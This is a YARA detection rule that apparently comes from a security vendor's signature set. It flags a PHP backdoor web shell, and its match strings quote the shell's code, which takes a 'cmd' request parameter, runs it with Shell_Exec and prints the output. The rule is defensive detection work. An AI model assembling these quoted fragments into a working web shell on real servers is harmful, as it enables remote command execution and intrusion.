rule Backdoor_Webshell_PHP_000042
{
    meta:
        description = "g_sercurity"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-11-29"
        
    strings:
        $a = "<? $cmd = $_REQUEST[\"-cmd\"];?>"
        $b = "<? if($cmd != \"\") print Shell_Exec($cmd);?>"
        $c = "<?=$cmd?>"
        $d = "<?"
        
    condition:
        all of them
}